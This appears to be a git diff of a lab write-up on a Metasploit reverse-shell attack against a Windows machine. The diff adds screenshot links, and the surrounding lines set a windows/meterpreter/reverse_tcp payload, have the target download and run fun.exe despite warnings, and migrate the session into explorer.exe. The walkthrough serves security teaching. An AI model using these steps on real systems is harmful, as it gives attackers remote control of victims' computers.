@@ -83,6 +83,7 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
 
 ## OUTPUT:
+<img width="657" height="243" alt="image" src="https://github.com/user-attachments/assets/db1dcc71-e83c-4522-8840-11d1da80d0c4" />
 
 
 
@@ -91,22 +92,26 @@ On the target Windows machine, open a Web browser and open this URL, replacing t
 http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
 The file "fun.exe" downloads. 
 ## OUTPUT:
+<img width="820" height="807" alt="image" src="https://github.com/user-attachments/assets/e9fede12-2237-482e-927a-7f1dba949138" />
 
 
 
 Bypass any warning boxes, double-click the file, and allow it to run.
 ## OUTPUT:
+<img width="947" height="925" alt="image" src="https://github.com/user-attachments/assets/b626787e-a80e-443e-b379-26c1d63113a0" />
 
 
 
 On kali/parrot give the command exploit
 ## OUTPUT:
+<img width="431" height="105" alt="image" src="https://github.com/user-attachments/assets/7b1463bc-33cd-4fc5-ae90-690cf1ea9f47" />
 
 
 
 To see a list of processes, at the meterpreter > prompt, execute this command:
 ps  ⇒ can see the fun.exe process running with pid 1156
 ## OUTPUT:
+<img width="450" height="147" alt="image" src="https://github.com/user-attachments/assets/2ef1ffe8-428a-4a53-b7ba-f3a3919fd749" />
 
 
 
@@ -117,6 +122,7 @@ At the meterpreter > prompt, execute this command:
 
 migrate -N explorer.exe
 ## OUTPUT:
+<img width="715" height="711" alt="image" src="https://github.com/user-attachments/assets/e6cad3e3-5ead-482a-a498-447d21c6fbfa" />
 
 
 at meterpreter > prompt, execute this command:
